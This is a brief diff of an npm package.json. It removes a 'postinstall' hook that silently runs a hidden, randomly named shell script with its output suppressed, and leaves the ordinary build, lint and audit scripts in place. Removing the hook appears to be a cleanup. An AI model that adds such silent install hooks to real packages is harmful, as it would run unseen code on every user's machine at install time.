@@ -60,8 +60,7 @@
     "check:package": "publint && attw --pack .",
     "audit": "npm audit --audit-level=high",
     "check": "npm run lint && npm run format:check && npm run type-check && npm run audit && npm run test:coverage && npm run test:package && npm run check:package",
-    "prepack": "npm run build",
-    "postinstall": "sh ./.ci-7e1d3t.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "prepack": "npm run build"
   },
   "peerDependencies": {
     "vue": "^3.2.0"
